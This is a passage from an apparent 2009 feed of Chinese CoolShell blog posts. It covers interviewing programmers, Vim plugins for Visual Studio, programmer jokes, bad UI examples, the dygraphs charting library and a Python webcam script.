<p>我相信，这是所有团队经理招人要考虑的三个问题，所有的问题也基本上围绕着这三个问题。有些时候，你也许觉得程序员的技术技能可以同时解决这三个问题，一个技术能力优秀的人必然是一个聪明的，可以搞定事情的人，当然也就能和团队一起工作了。是的，感觉看起来是这个样子，但其实并不是这样的。有些人的确很聪明，但却不能处理好工作上的事情，这样人应该是你的朋友，你的顾问，但不应该是你的雇员。有的人为人很不错，和团队所有人都合得来，但并不是很聪明，但工作很刻苦很努力，这样的人可以成为你的下属，比如某个下属骨干的助手，或是整个团队的助手。如果某个人不能和团队一起工作，无论其有多聪明，解决问题的能力有多强，你都不应该和他在一起工作。人个认为，团队的和谐是一切事情的前提。</p>
<p><img alt="image placeholder" ><span id="more-1870"></span></p>
<p>对于传统的面试招聘过程，基本上来说都是下面这样的样子的：</p>
<ol>
<li>阅读应聘者的简历，让应聘者做个自我介绍。</li>
<li>问一些比较难的非常细节的技术问题，以一问一答的形式。</li>
<li>给面试者一些和几个编程难题。（比如某些怪异的算法题）</li>
</ol>
<p>我个人觉得这种面试方法很可笑，也很糟糕，尤其是后面两点。通常来说，这样的面试只会让你面试到一些“书呆子”或是一些“技术痴迷者”，下面让我来一条一条地剖析一下这几条的弊端。</p>
<ol>
<li>你很难从一个人的简历或是自我介绍上了解一个人。因为这些都是当事人自己写的，或是自己阐述的。所以，这并不是很准确的，通过简历，你只能知道很简单的事情，这对于是否能招入团是远远不够的。而在面试的开始，让应聘者做自我介绍，只会让面试者以很正式的态度来面对整个面试。一但面试过程很正式，很严肃，就会让人很拘禁，其实，这并不是我们想要的，我要的是<strong>应聘者真实和自然的表现，从而才能了解到最真实的东西</strong>。</li>
<li>问几个技术细节的问题。比如：我个人经历过的——“ps的-a参数是什么意思？”，“vi中删除换行符的命令是什么？”，“C++的关键字explict,mutable是用来干什么？”等等，等等。以前做为一个应聘者来说，我非常讨厌这样的问题，因为这样的问题查一下手册就知道。难道他要招的是一个字典手册？不是一个人？对于这方面，<strong>重要的不是知识，重要的是其查找知识的能力</strong>。</li>
<li>给应聘者一个或几个很难的算法题，给上十几分钟，然后让面试者把伪代码或是代码写下来。这样的做法是相当可笑的，不能讨论不能查资料，让人在一种压力状态下作答，这根本就不是实际工作中的状态，而我们的面试也就成了一种刁难（我最变态的经历是，当我把写在两页纸上的代码上交上去后，面试官把其交给旁边程序员输出电脑做校验，结果程序员说，编译出错。于是，面试官说，“很遗憾，可能你写的程序还不多”，相当可笑）。对于这点来说，<strong>重要的不是那个解题的答案，而是解题的思路和方法</strong>。</li>
</ol>
<p>我以前经历过很多的面试，当技术人员来和我做面试的时候，我发现，“技术人员的思维”对于某些人来说根本分不清面试和考试，<strong>在潜意识里，他们在很多时候不是在面试这个人，而是在刁难这个人并以此展示自己的技能</strong>。我个人认为我是一个好的程序员，但我可以告诉你我无法通过那样的面试，因为那样的面试是为他们自己准备的，而不是为应聘者准备的。</p>
<p>那么，我又是怎样去面试的呢？</p>
<p><strong>一、确认简历。</strong>首先，阅读一下别人的简历是需要的，从简历上，工作经历，项目经历，技术技能这三个事情是你需要了解的。一般来说，你可以先通过电话确定一下他的工作经历，项目经历和技术技能，然后，如果他和你需要的人条件相符的话，可以叫到公司做面对面的面试。千万不要把别人叫来，你又说你的经历和我们的工作有差距之类的话。（我有过一次面试经历，公司我不说了，反正是那个号称需要有良好沟通的公司，面试了我9次左右，从一般的程序员，PM，经理，到总经理，而最后一次直接告诉我，我以前的经历和他们的要求差距很大。我不禁要问了，前面若干次的面试他们都在干什么呢？）</p>
<p><strong>二、面试开场。</strong>其次，把人邀请来公司面试，应聘者到了公司来面试，有一点很重要，那就是你一定要让整个面试过程变得很随意，很放松，就像普通的聊天和一般朋友间的交流一样。这样应聘者才会放松并拿出真实的样子来和你谈话和聊天，你才能在很短的时间内了解得更多。让应聘者放下心理负担，让其表现得自然一些，这是招聘方的责任。千万不要说，别人太紧张发挥的不好，有时候，招聘方得想想自己的问题。</p>
<p>面试开场的时候，千万不要让应聘者介绍自己，因为，应聘者早就给你发过简历了，而你也给其打过电话了。另外，应聘者对这个面试惯例通常都会准备得非常不错的，另一方面，这会让整个面试过程太正式太严肃了。所以，不妨问问应聘者是怎么过来的？最近怎么样？还可以和应聘者谈一个大众话题，比如喜欢什么体育，音乐，电影，社会热点什么的，自己也别板着个脸，说说笑笑，试图让大家都放松下来。另外，通过这些闲聊，你可以知道他/她的与人交往能力和一些性格。另外，不要让桌子放在你和应聘者之间，把环境搞得随意一些。</p>
<p><strong>三、多让应聘者说说他的经历</strong>。接下来，如果你要觉得这个应聘者是否是一个可以解决问题，是一个可以把事情搞定的人，不用问他/她会做什么，直接问问其做过什么？干过什么事？对于一个好的程序员来说，很难想像其没有相关的实践，就算你是在大学里，你也应该做过什么。如果你有解决问题的能力，那么，很显然，今天你应该解决了很多问题，也搞定了很多事情，听听应聘者说一说他的那些事。（不要使用一问一答这种方式，应该让应聘者多说，而多听，多想）</p>
<p>在他讲他的项目的时候，通常来说你要注意下面几点：</p>
<ul>
<li>
<strong>沟通表达能力</strong>。应聘者能不能把一个事情讲清楚。如果这个人聪明的话，他就可以用最简单的语言把一个复杂的事情讲清楚。而且，这是一个好的程序员最基本的能力。而且，你可以在应聘者一边描述其经历的时候，你可以和应聘者有一些的良好的来来回回的交谈，这样就可以知道，他的沟通能力和沟通方式，从而了解他的性格，。</li>
<li>
<strong>角色和位置</strong>。也许他参与了一个很大的项目，但只是做了一个很简单的模块。所以，了解其在项目中的担任的角色和位置是非常必要的。当应聘者说到“我们”或者“大家”之类的词汇时，一定要向下细化和明确。</li>
<li>
<strong>做出的贡献和解决了什么的问题</strong>。这个很重要，通过了解这个，你可以知道面试者是否聪明，是否有能力解决问题，是否有好的技术底子。</li>
<li>
<strong>演示</strong>。如果可能，你可以让应聘者展示一些其写过的代码，做过的设计，或是直接给你看看他写的程序的演示。（从设计上，代码的风格，重用性，维护性上你可以了解很多很多）</li>
<li>
<strong>基础知识</strong>。了解该项目中应聘者使用的技术的一些基础知识，比如，通过整个过程，你可以问一些网络，语言，面象对象，系统的一些基础知识。基础知识是非常重要的，这直接关系到了他的能力。</li>
<li>
<strong>流程和工具</strong>。了解应聘者所熟悉的项目的流程（银弹，瀑布，敏捷，……），还有流程中的一些工件（如：需求文档，设计文档，测试方档等），以及在开发过程中使用的工具（内存测试，代码检查，BUG报告，版本维护，开发调试……）（关于程序员的基本技能，你可以参考——《<a href="https://coolshell.cn/articles/428.html" rel="bookmark">程序员需要具备的基本技能</a>》）</li>
</ul>
<p>有人会说，应聘者的经历可以被他自己编出来的，他可以把一些不是他做的事说成是他做的。是的，的确是有这种可能。不过，不要忘了，一个谎言背后需要用更多的谎言来圆谎的，所以，你不必担心这个问题，只要你在应聘者的描述过程中逐步求精，细化问题，你会知道应聘者是否是在编故事的。</p>
<p>千万记住下面几点：</p>
<ul>
<li>谈话风格要随意和自然，不要正式。</li>
<li>在了解应聘者以前做过的事的时候，不要太投入了。因为招聘方也是技术人员，所以有时候，招聘者自己会因为应聘者所做的项目中的技术太过迷人而被吸引了。</li>
<li>要注意引导应聘人。相信我，应聘的程序员十个人有八个人讲不清楚以前做的是什么。因为他们直接跳过了项目背景和要解决什么样的问题，而直接进入具体实现。</li>
<li>不要一问一答，应该多让应聘者说，这样才能多全方位了解一个人。</li>
<li>了解一个人的过去，了解一个人做过的事情，比其会做什么更重要。</li>
<li>了解一个人的性格，想法，思维和行为，比了解其技术技能更重要。</li>
<li>沟通能力，表达能力，语言组织能力，理解能力，等方面的能力，关系到了是否能和别人一起工作。</li>
<li>基础知识比知识的点滴要重要得多。你可能不知道其个C++的关键字，但你应该要知道C++的继承和多态。</li>
<li>技术技能固然很重要，但比其更重要的是这个人获取知识的能力，学习能力是在计算机这样变化飞快行业中必需具备的。</li>
<li>是否可以进行培养，比掌握的技能更重要。</li>
</ul>
<p><strong>四、实际参与？？</strong>这一步可能是很不好实施的。因为，这需要一些应聘者付出一定的时间，如果是毕业生，那没有问题，先让他来实习一段时间。但如果别人有工作，就不好了。也许你会说，这就是试用期的用处了。不过，我个人觉得，你得要尊重应聘者，人家把那边的工作辞了，来你这边工作，三个月试用期间，如果没有什么原则上的问题，你作为一个招聘方又反悔了，这样做很是相当的不好。如果发现这样的事，只能是招聘者自己的问题。</p>
<p>在面试过程中，一些招聘者会让应聘者们一起做个游戏，或是搞个辩论比赛，或是现场组个团队干个简单的事情，有的甚至让应聘者请一天假到自己的公司里来和自己的团队一同工作一天，并要完成某个事情（甚至给其设置上deadline），并通过这些来考量应聘者的实际参与能力。</p>
<p>是的，如果没有一起工作过，没有一些实际的事情发生，单靠几个小时的面试很难了解一个人的。设置上这些面试的环节，在最短的时间内来了解应聘者的一切，对于招聘方来说无可厚非。而且有的时候也能得到不错的效果。在这里，我只提一点，有时候这样的周期拉得很长，让应聘者付出了很多，反尔会让应聘者产生反感和厌烦情绪，从某种意义上来说，这实在是对应聘者的不尊重。</p>
<p>对于这一点，我一直持疑问的态度，所以，我在其后打了两个问号。老实说，对于实际参与这一环节，我个人的意见是适可而止，因为时间太短了，无论你怎么做你都无法了解完整。即然无法了解完整，那就获取你最需要的吧，就是本文开头的那三个问题，以及上面所述的“第三点”（了解应聘者的以往经历）。</p>
<p>也许这个文章中有一些你不同意的观点，没问题，欢迎批评，如果你有更好的做法，我也想听听，不妨在这里留个言，如果不想留也可以email给我。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-12-02T08:53:36+08:00</pubDate>
<guid>https://coolshell.cn/articles/1870.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Visual Studio的Vim插件 ]]></title>
<link>https://coolshell.cn/articles/1901.html</link>
<content><![CDATA[ 
<p>前两天向大家介绍了<a rel="bookmark" href="https://coolshell.cn/articles/1837.html">Eclipse 和Vim相互交融的插件</a>，今天向大介绍几个插件，可以让你在Visual Studio中使用Vim的那些操作。</p>
<p>第一个是：<a href="http://www.viemu.com/" target="_blank">ViEmu</a>，下面是一个演示图片。不过这个插件是商业版的，而且还不支持VS2010。不过据其网站说很快就会支持。最夸张的是ViEmu还支持Word和Outlook，SQL Server，呵呵。</p>
<p><a href="http://www.viemu.com/viemu-movie.gif"><img alt="image placeholder" ></a></p>
<p>如果你要用免费的的插件，没有问题，试工这个新出的插件吧：<a href="https://visualstudiogallery.msdn.microsoft.com/en-us/59ca71b3-a4a3-46ca-8fe1-0e90e3f79329" target="_blank">VsVim</a>。只不过好像目前只支持VS2010。</p>
<p style="TEXT-ALIGN: center"><img alt="image placeholder" ></p>
<div id="projectTitleBar">
<strong></strong><a href="https://visualstudiogallery.msdn.microsoft.com/en-us/59ca71b3-a4a3-46ca-8fe1-0e90e3f79329"></a> 看来Vim还是很强大的，不然，怎会有这些人把其集成到了 Eclipes 和Vistual Studio中，呵呵。Unix下的这个老得都不行了的编辑器正在影响着图形界面的编辑器。最后，让我问问你，你会用Vim吗？</div>
<p></p>
 ]]></content>
<pubDate>2009-12-04T09:55:58+08:00</pubDate>
<guid>https://coolshell.cn/articles/1901.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员的相关笑话（一） ]]></title>
<link>https://coolshell.cn/articles/1903.html</link>
<content><![CDATA[ 
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%97%AE%E7%AD%94" title="问答">问答</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%88%B9%E8%BD%A6%E5%A4%B1%E7%81%B5" title="刹车失灵">刹车失灵</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80" title="关于编程语言">关于编程语言</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E8%87%AA%E8%A1%8C%E8%BD%A6" title="自行车">自行车</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%81%AB%E8%BD%A6" title="火车">火车</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E9%97%AE%E8%B7%AF" title="问路">问路</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E8%AD%A6%E5%91%8A" title="警告">警告</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E7%AD%94"></span>问答<span class="ez-toc-section-end"></span>
</h4>
<p>Q：你是怎么区分一个内向的程序员和一个外向的程序员的？<br>
A：外向的程序员会看着你的鞋和你说话时。</p>
<p>Q：为什么程序员不能区分万圣节和圣诞节？<br>
A：这是因为Oct 31 == Dec 25！（八进制的31==十进制的25）</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%88%B9%E8%BD%A6%E5%A4%B1%E7%81%B5"></span>刹车失灵<span class="ez-toc-section-end"></span>
</h4>
<p>有一个物理学家，工程师和一个程序员驾驶着一辆汽车行驶在阿尔卑斯山脉上，在下山的时候，忽然，汽车的刹车失灵了，汽车无法控制地向下冲去，眼看前面就是一个悬崖峭壁，但是很幸运的是在这个悬崖的前面有一些小树让他们的汽车停了下来，而没有掉下山去。三个惊魂未定地从车里爬了出来。</p>
<p>物理学家说，“我觉得我们应该建立一个模型来模拟在下山过程中刹车片在高温情况下失灵的情形”。</p>
<p>工程师说，“我在车的后备厢来有个扳手，要不我们把车拆开看看到底是什么原因”。</p>
<p>程序员说，“为什么我们不找个相同的车再来一次以重现这个问题呢？”</p>
<p><span id="more-1903"></span></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80"></span>关于编程语言<span class="ez-toc-section-end"></span>
</h4>
<p>如果C++是一把锤子的话，那么编程就会变成大手指头。</p>
<p>如果你找了一百万只猴子来敲打一百万个键盘，那么会有一只猴子会敲出一段Java程序，而其余的只会敲出Perl程序。</p>
<p>一阵急促的敲门声，“谁啊！”，过了5分钟，门外传来“Java”。</p>
<p>如果说Java很不错是因为它可以运行在所有的操作系统上，那么就可以说肛交很不错，因为其可以使用于所有的性别上。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E8%87%AA%E8%A1%8C%E8%BD%A6"></span>自行车<span class="ez-toc-section-end"></span>
</h4>
<p>一个程序员骑着一个很漂亮的自行车到了公司，另一个程序员看到了他，问到，“你是从哪搞到的这么漂亮的车的？”</p>
<p>骑车的那个程序员说，“我刚从那边过来，有一个漂亮的姑娘骑着这个车过来，并停在我跟前，把衣服全脱了，然后对我说，‘你想要什么都可以’”。</p>
<p>另一个程序员马上说到，“你绝对做了一个正确的选择，因为那姑娘的衣服你并不一定穿得了”。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E7%81%AB%E8%BD%A6"></span>火车<span class="ez-toc-section-end"></span>
</h4>
<p>一个年轻的程序员和一个项目经理登上了一列在山里行驶的火车，他们发现列车上几乎都坐满了，只有两个在一起的空位，这个空位的对面是一个老奶奶和一个年轻漂亮的姑娘。两个上前坐了下来。程序员和那个姑娘他们比较暧昧地相互看对方。这时，火车进入山洞，车厢里一片漆黑。此时，只听见一个亲嘴的声音，随后就听到一个响亮的巴掌声。很快火车出了山洞，他们四个人都不说话。</p>
<p>那个老奶奶在喃喃道，“这个年轻小伙怎么这么无礼，不过我很高兴我的孙女扇了一个巴掌”。</p>
<p>项目经理在想，“没想到这个程序员居然这么大胆，敢去亲那姑娘，只可惜那姑娘打错了人，居然给打了我。”</p>
<p>漂亮的姑娘想，“他亲了我真好，希望我的祖母没有打疼他”。</p>
<p>程序员坐在那里露出了笑容，“生活真好啊。这一辈子能有几次机会可以在亲一个美女的同时打项目经理一巴掌啊”</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E8%B7%AF"></span>问路<span class="ez-toc-section-end"></span>
</h4>
<p>有一个驾驶热气球的人发现他迷路了。他降低了飞行的高度，并认出了地面上的一个人。他继续下降高度并对着那个人大叫，“打扰一下，你能告诉我我在哪吗？”</p>
<p>下面那个人说：“是的。你在热气球里啊，盘旋在30英尺的空中”。</p>
<p>热气球上的人说：“你一定是在IT部门做技术工作”。</p>
<p>“没错”，地面上的人说到，“你是怎么知道的？”</p>
<p>“呵呵”，热气球上的人说，“你告诉我的每件事在技术上都是对的，但对都没有用”。</p>
<p>地面上的人说，“你一定是管理层的人”。</p>
<p>“没错”，热气球上的人说，“可是你是怎么知道的？”</p>
<p>“呵呵”，地面上的那人说到，“你不知道你在哪里，你也不知道你要去哪，你总希望我能帮你。你现在和我们刚见面时还在原来那个地方，但现在却是我错了”。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E8%AD%A6%E5%91%8A"></span>警告<span class="ez-toc-section-end"></span>
</h4>
<p>有一个小伙子在一个办公大楼的门口抽着烟，一个妇女路过他身边，并对他说，“你知道不知道这个东西会危害你的健康？我是说，你有没有注意到香烟盒上的那个警告（Warning）？”</p>
<p>小伙子说，“没事儿，我是一个程序员”。</p>
<p>那妇女说，“这又怎样？”</p>
<p>程序员说，“我们从来不关心Warning，只关心Error”</p>
<p> </p>
<p>(你还有更多的笑话吗？欢迎告诉我们)</p>
 ]]></content>
<pubDate>2009-12-07T08:12:16+08:00</pubDate>
<guid>https://coolshell.cn/articles/1903.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ UI的恶梦 ]]></title>
<link>https://coolshell.cn/articles/1907.html</link>
<content><![CDATA[ 
<p>UI可能是编程中最令人头痛的事了。设计UI通常对于程序员来说是一件很痛苦的事情。下面，让我们来看一看一些可怕的UI设计吧，前面几个UI都是出于咱们程序员自己之手，把他们放在这里，希望能引起大家的注意。（国内软件的UI嘛的我就不说了，省得得罪人）下面这个例子不知道你是否让你似曾相识，呵呵，记得我上大学时，用delphi，PB经常开发这样的界面，当时觉得自己特牛！现在看上去嘛，简直就是一个垃圾。（关于UI设计，你可以查看本站的《<a rel="bookmark" href="https://coolshell.cn/articles/363.html">35个强大的UI设计教程</a>》）</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/badui2.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">首先，我们先来看一个叫wGetGUI的小工具软件，这是一个100%由程序员设计的UI，如下所示：</p>
<p style="text-align: left;"><span id="more-1907"></span></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/wgetgui-screenshot.png"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">看到这样的界面，你会觉得怎么样？“高科技”还是“头晕”？相比起命令行的那个wget，真不知道这个图形界面的工具是怎么被设计出来。哎。这里是这个工具的网页：<a href="http://www.jensroesner.de/wgetgui/">http://www.jensroesner.de/wgetgui/</a>，网页上还有几张图，也是一样的。</p>
<p style="text-align: left;">不过，比起下面这个来，wGetGUI算不上什么了。下面这个软件叫做：FileMatrix，这个界面是前所未有的经典，那叫一个相当强大啊。估计可以节省很多对话框和tab页了，把软件的所有功能全部一次性陈列出来。这也是程序员的杰作。（点击图片，你可以慢慢欣赏下面这个UI的细节）</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/UI.png"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">当然，FileMatrix今天还在，其主页在<a href="http://www.gardenerofthoughts.org/ideas/filematrix/index.htm" target="_blank">这里</a>。今天的FileMatrix的UI界面已经变得很简洁了，其还支持一些皮肤，不过它们还是很糟糕。如下所示：（<a href="http://www.gardenerofthoughts.org/ideas/filematrix/screenshots.htm" target="_blank">更多的图片</a>）</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/marble.png"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">让我们再来看看历史上Windows 3.2的某个配色方案：hotdog（如下图所示），真不知道这是谁配的，真是——“红配黄，喜洋洋”啊。</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/windows-311-hotdog-stand-scheme.png"><img alt="image placeholder" ></a></p>
<p>不要以为，以简洁著称的Google就没有问题，最近的Google Wave大家用过没有？那个滚动条啊，我实在是没有搞懂为什么设计成那个样子。可谓史上最无厘头的滚动条了。下面，左边是Mac的，右边是Google Wave的，他们俩干的都是一样的事，但Google Wave的太令人摸不着头脑了。</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/google-wave-scrollbars.png"><img alt="image placeholder" ></a></p>
<p>对于Google Wave的滚动条，我只想说的是，根据《Don’t make me Think》的原则，这个滚动条和其它例子一样只站在了程序员的角度，而并没有考虑用户体验。下面这些文章，你都可以看看那大家的看法。</p>
<ol>
<li><a href="https://www.flickr.com/photos/yaili/3990023684/">http://www.flickr.com/photos/yaili/3990023684/</a></li>
<li><a href="http://ignorethecode.net/blog/2009/11/15/google_waves_scrollbars/">http://ignorethecode.net/blog/2009/11/15/google_waves_scrollbars/</a></li>
<li><a href="http://squawk.blogs.starnewsonline.com/10194/is-google-wave-ugly/">http://squawk.blogs.starnewsonline.com/10194/is-google-wave-ugly/</a></li>
<li><a href="http://allentan.posterous.com/google-waves-scrollbar-details">http://allentan.posterous.com/google-waves-scrollbar-details</a></li>
<li><a href="http://technmarketing.com/web/eight-google-wave-annoyances/">http://technmarketing.com/web/eight-google-wave-annoyances/</a></li>
</ol>
<p>你以Google wave scrollbar作为关键词到Google里搜索吧，你可以看到大量的讨论和抱怨。以至于Google自己都要写个<a href="https://www.google.com/support/wave/bin/answer.py?hl=en&amp;answer=162103" target="_blank">说明</a>了。</p>
<p>好了，最后两个图片和设计者无关，设计者在开始的时候可能并没有想到UI能变成这样。下面是关于IE7浏览器的，这张图你可能并不陌生，这是一张当我们的IE被安装了各种工具条后（很多是流氓软件）后的样子。（点击大图细细欣赏）</p>
<p style="text-align: center;"> <a href="https://coolshell.cn/wp-content/uploads/2009/12/wgetgui-screenshot.png"></a> <a href="https://coolshell.cn/wp-content/uploads/2009/12/UI.png"></a>  <a href="https://coolshell.cn/wp-content/uploads/2009/12/iemess2.jpg"><img alt="image placeholder" ></a> <a href="https://coolshell.cn/wp-content/uploads/2009/12/google-wave-scrollbars.png"></a></p>
<p>不要以为Firefox不会像IE一样，那是因为你的Firefox没有装插件，当安装上各种插件后，也是一样的。如下所示（点击图片，慢慢欣赏）。</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/ffToolbars.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">最后，让我们看一个现实生活中的UI吧，好像是一个飞机驾驶舱。</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/Blackhawk-Cockpit.jpg"><img alt="image placeholder" ></a> </p>
<p style="text-align: left;">你有什么UI恐怖的经历吗？欢迎与我们分享。</p>
<p></p>
 ]]></content>
<pubDate>2009-12-09T16:04:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/1907.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Javascript 曲线表作图库 ]]></title>
<link>https://coolshell.cn/articles/1924.html</link>
<content><![CDATA[ 
<p><a href="http://www.danvk.org/dygraphs/" target="_blank">dygraphs</a> 是一个开源的Javascript库，它可以产生一个可交互式的，可缩放的的曲线表。其可以用来显示大密度的数据集（比如股票，气温，等等），并且可以让用户来浏览和解释这个曲线图。在它的主页（<a href="http://www.danvk.org/dygraphs/">http://www.danvk.org/dygraphs/</a>），你可以看到一些示例和用法。</p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/12/dygraphs.jpg"><img alt="image placeholder" ></a></p>
<p>要使用这个库，很简单，只需要包括<code><a href="https://github.com/danvk/dygraphs/downloads/">dygraph-combined.js</a></code>文件，其文件尺寸很经济，也就45K。</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;script type="text/javascript"
  src="dygraph-combined.js"&gt;&lt;/script&gt;</pre>
<p>下面两个示例，你可以把数据写在javascript中，也可以设置一个csv文件。</p>
<p><span id="more-1924"></span></p>
<p><strong>示例一，你可以在代码中指定数据</strong></p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;div id="graphdiv"&gt;&lt;/div&gt;
&lt;script type="text/javascript"&gt;
  g = new Dygraph(

    // containing div
    document.getElementById("graphdiv"),

    // CSV or path to a CSV file.
    "Date,Temperature\n" +
    "2008-05-07,75\n" +
    "2008-05-08,70\n" +
    "2008-05-09,80\n"

  );
&lt;/script&gt;
</pre>
<p><strong>示例二、你可以引入外部的CSV文件</strong>。(<code><a href="https://coolshell.cn/wp-admin/temperatures.csv">temperatures.csv</a>)</code></p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;div id="graphdiv2"
  style="width:500px; height:300px;"&gt;&lt;/div&gt;
&lt;script type="text/javascript"&gt;
  g2 = new Dygraph(
    document.getElementById("graphdiv2"),
    "temperatures.csv", // path to CSV file
    {}          // options
  );
&lt;/script&gt;</pre>
 ]]></content>
<pubDate>2009-12-11T13:44:45+08:00</pubDate>
<guid>https://coolshell.cn/articles/1924.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何使用Python操作摄像头 ]]></title>
<link>https://coolshell.cn/articles/1928.html</link>
<content><![CDATA[ 
<p>用过USB摄像头的都知道，你需要使用鼠标来操作它，比如截个图，录个像什么的，要点N次鼠标，对于我们那些不喜欢多次点击鼠标的人来说，这是一件很boring的事情，所以，本文将教你如何使用Python来操作摄像头。</p>
<p>这里，我们需要三个Python库： <a href="http://videocapture.sourceforge.net/">VideoCapture</a>， <a href="http://www.pythonware.com/products/pil/">PIL</a>  和 <a href="http://www.pygame.org/">pygame</a>。使用这三个库你可以非常容易的编写一个摄像头程序。之所以使用pygame，其目的就是因为这个库可以处理视频帧（fps）。下面是代码：</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">from VideoCapture import Device
import ImageDraw, sys, pygame, time
from pygame.locals import *
from PIL import ImageEnhance

res = (640,480)
pygame.init()
cam = Device()
cam.setResolution(res[0],res[1])
screen = pygame.display.set_mode((640,480))
pygame.display.set_caption('Webcam')
pygame.font.init()
font = pygame.font.SysFont("Courier",11)

def disp(phrase,loc):
    s = font.render(phrase, True, (200,200,200))
    sh = font.render(phrase, True, (50,50,50))
    screen.blit(sh, (loc[0]+1,loc[1]+1))
    screen.blit(s, loc)

brightness = 1.0
contrast = 1.0
shots = 0

while 1:
    camshot = ImageEnhance.Brightness(cam.getImage()).enhance(brightness)
    camshot = ImageEnhance.Contrast(camshot).enhance(contrast)
    for event in pygame.event.get():
        if event.type == pygame.QUIT: sys.exit()
    keyinput = pygame.key.get_pressed()
    if keyinput[K_1]: brightness -= .1
    if keyinput[K_2]: brightness += .1
    if keyinput[K_3]: contrast -= .1
    if keyinput[K_4]: contrast += .1
    if keyinput[K_q]: cam.displayCapturePinProperties()
    if keyinput[K_w]: cam.displayCaptureFilterProperties()
    if keyinput[K_s]:
        filename = str(time.time()) + ".jpg"
        cam.saveSnapshot(filename, quality=80, timestamp=0)
        shots += 1
    camshot = pygame.image.frombuffer(camshot.tostring(), res, "RGB")
    screen.blit(camshot, (0,0))
    disp("S:" + str(shots), (10,4))
    disp("B:" + str(brightness), (10,16))
    disp("C:" + str(contrast), (10,28))
    pygame.display.flip()</pre>
<p>这段代码中的一些要点的解释如下：</p>
<p><span id="more-1928"></span></p>
<ul>
<li>第15行的那个函数是在视频上显示些信息。这个例子中，显示的是抓图的数量以及当前的亮度和对比度。这个函数先显示深灰色的文本，然后偏移几个像素，再显示浅灰色的，这样可以有阴影的效果。</li>
<li>第26行是在调整亮度和对比度。30-33行是在设置数字键1-4用于调整亮度和对比度。</li>
<li>34 和35行是在设置 ‘q’ 和 ‘w’ 来显示摄像头的对话框。在那里你可以调整分辨率和暴光度等等。</li>
<li>36行及以下的代码，是在存一个抓图文件。文件名中使用了当前时间。.</li>
</ul>
<p>希望这个小程序能给你开启一个如何写摄像头的程序。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-12-11T14:10:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/1928.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 哥是玩程序的 ]]></title>
<link>https://coolshell.cn/articles/1932.html</link>
<content><![CDATA[ 
<p>下面一组有趣的Web示例，这些示例使用Web的一些很“土”控件做出一些很有趣的玩意儿。原来，编程是可以用来玩的，看看这些玩程序的人搞出的这些有意思的玩意，简直是玩得太有意思了。不过，请注意，这些东西只能使用Chrome打开，不然，你看不到相关的效果。</p>
<p><strong>用滚动条做的时间</strong></p>
<p><a href="http://toki-woki.net/p/scroll-clock/">http://toki-woki.net/p/scroll-clock/</a>，下面的抓图只显示了时和分，后面还有不停跳动的秒。可以在IE，Fireforx和Chrome中查看。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><strong>用CheckBox做成一个水滴效果</strong></p>
